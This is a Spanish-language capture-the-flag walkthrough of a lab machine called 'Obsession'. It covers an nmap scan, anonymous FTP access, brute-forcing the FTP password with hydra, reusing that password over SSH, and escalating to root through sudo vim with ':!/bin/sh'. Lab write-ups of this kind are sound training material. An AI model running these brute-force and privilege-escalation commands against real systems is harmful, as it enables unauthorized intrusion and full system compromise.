# Obsession
## 1. Reconocimiento de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash
nmap -sC -sV --open <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `21/tcp open ftp vsftpd 3.0.5`: El puerto 21 está abierto y ejecuta el servidor FTP vsftpd versión 3.0.5. El escaneo también indica que el **login anónimo está permitido** (`ftp-anon: Anonymous FTP login allowed`).
*   `22/tcp open ssh OpenSSH 9.6p1 Ubuntu`
*   `80/tcp open http Apache httpd 2.4.58 ((Ubuntu))`

La posibilidad de acceso FTP anónimo es una pista importante para el acceso inicial.

## 2. Enumeración Web

Al analizar el aplicativo web en el puerto 80, identificamos una frase crítica en el contenido:

> "-- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente --"

Esta pista sugiere una vulnerabilidad de **reutilización de credenciales** (Password Reuse). Además, el nombre `russoski` aparece repetidamente, señalándolo como un usuario potencial del sistema.

## 3. Enumeración FTP Anónima

### 3.1. Inspección de Archivos

Aprovechamos la configuración insegura del servicio FTP para acceder sin credenciales (`anonymous`).

```bash
ftp <IP_DEL_OBJETIVO>
# Name: anonymous
# Password: (vacío)
```

Encontramos y descargamos dos archivos de texto:

- `chat-gonza.txt`: Revela una conversación entre los usuarios `russoski`, `gonza` y `Nagore`.
- `pendientes.txt`: Contiene una nota sobre seguridad: _"Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos permisos habilitados que no son del todo seguros.."_.

Esta información confirma la existencia del usuario `russoski` y sugiere una posible mala configuración de privilegios en el sistema.

## 4. Obtención de Credenciales y Acceso Inicial

Basándonos en la pista de la web (reutilización de contraseñas) y el usuario confirmado `russoski`, procedemos a atacar el servicio FTP por ser generalmente más rápido y menos monitoreado que SSH para ataques de fuerza bruta.

### 4.1. Fuerza Bruta con Hydra

Ejecutamos `hydra` contra el servicio FTP usando el diccionario `rockyou.txt`.

```bash
hydra -l russoski -P /path/to/wordlist/rockyou.txt -u ftp://<IP_DEL_OBJETIVO>
```

**Resultado:**

*   `[21][ftp] host: <IP_DEL_OBJETIVO> login: russoski password: iloveme`

La contraseña es **iloveme**.

Hay varios archivos y una foto pero no contienen información relevante.

### 4.2. Conexión SSH

Siguiendo la pista de "el mismo usuario para todos mis servicios", utilizamos las credenciales obtenidas en el FTP para autenticarnos vía SSH.

```bash
ssh russoski@<IP_DEL_OBJETIVO>
# Password: iloveme
```

El acceso es exitoso.

## 5. Escalada de Privilegios

Una vez que hemos obtenido acceso SSH como el usuario `russoski`, el objetivo es escalar privilegios a `root`.

### 5.1. Enumeración de Sudoers

Una vez dentro, buscamos vectores de escalada revisando los permisos de `sudo`.

```Bash
sudo -l
```

**Salida:**

```
User russoski may run the following commands on ...:
    (root) NOPASSWD: /usr/bin/vim
```

El usuario puede ejecutar el editor de texto `vim` con privilegios de `root` y sin contraseña.

### 5.2. Explotación de Vim (GTFOBins)

`vim` permite la ejecución de comandos del sistema. Al ejecutarlo con `sudo`, podemos invocar una shell que heredará los permisos de superusuario.

```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```

Alternativamente, dentro de la interfaz de vim, podemos escribir `:!/bin/sh` y presionar Enter.

Confirmamos el compromiso total del sistema:

```bash
whoami
# root
```
